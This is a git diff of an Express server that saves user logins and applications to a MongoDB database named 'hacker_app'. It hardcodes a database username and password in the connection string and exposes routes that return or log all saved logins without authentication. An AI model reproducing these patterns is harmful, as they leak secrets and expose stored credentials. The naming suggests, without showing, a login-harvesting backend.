@@ -2,7 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
 const path = require('path');
-const mongoose = require('mongoose'); // ✅ Added for MongoDB
+const mongoose = require('mongoose');
 
 const app = express();
 app.use(cors());
@@ -13,12 +13,12 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, '../')));
 
 //
-// ✅ STEP 1: Connect to MongoDB Atlas
+// ✅ STEP 1: Connect to MongoDB Atlas (using hacker_app database)
 //
-const MONGO_URI = "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/?retryWrites=true&w=majority";
+const MONGO_URI = "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";
 
 mongoose.connect(MONGO_URI)
-  .then(() => console.log("✅ Connected to MongoDB Atlas"))
+  .then(() => console.log("✅ Connected to MongoDB Atlas (hacker_app)"))
   .catch((err) => console.error("❌ MongoDB connection error:", err));
 
 //
@@ -71,7 +71,7 @@ app.post('/save-application', async (req, res) => {
 });
 
 //
-// ✅ STEP 5: View saved logins (for testing)
+// ✅ STEP 5: View saved logins
 //
 app.get('/logins', async (req, res) => {
   try {
@@ -84,7 +84,7 @@ app.get('/logins', async (req, res) => {
 });
 
 //
-// ✅ STEP 6: View saved applications (for testing)
+// ✅ STEP 6: View saved applications
 //
 app.get('/applications', async (req, res) => {
   try {
@@ -98,7 +98,7 @@ app.get('/applications', async (req, res) => {
 //
 // ✅ STEP 7: Secure admin-only download route
 //
-const ADMIN_TOKEN = process.env.ADMIN_TOKEN; // Set in Render dashboard
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 
 app.get('/admin/download-login-file', async (req, res) => {
   const token = req.headers['x-admin-token'] || req.query.token;
@@ -119,23 +119,18 @@ app.get('/admin/download-login-file', async (req, res) => {
 });
 
 //
-// ✅ STEP 8: Start the server
+// ✅ STEP 8: Debug route to view MongoDB data in console
 //
-app.listen(3000, () =>
-  console.log('✅ Server running at http://localhost:3000')
-);
-
-// ✅ STEP 9: Debug route to view MongoDB data in console
 app.get('/debug', async (req, res) => {
   try {
     const logins = await Login.find().sort({ createdAt: -1 });
     const applications = await Application.find().sort({ createdAt: -1 });
 
     console.log("---- LOGINS ----");
-    console.log(JSON.stringify(logins, null, 2));
+    console.log(logins);
 
     console.log("---- APPLICATIONS ----");
-    console.log(JSON.stringify(applications, null, 2));
+    console.log(applications);
 
     res.send({ status: 'ok', message: 'Check server logs for MongoDB data' });
   } catch (err) {
@@ -143,6 +138,12 @@ app.get('/debug', async (req, res) => {
     res.status(500).send({ error: 'Database error' });
   }
 });
+
+//
+// ✅ STEP 9: Start the server
+//
+app.listen(3000, () => console.log('✅ Server running at http://localhost:3000'));
+
 
 
 
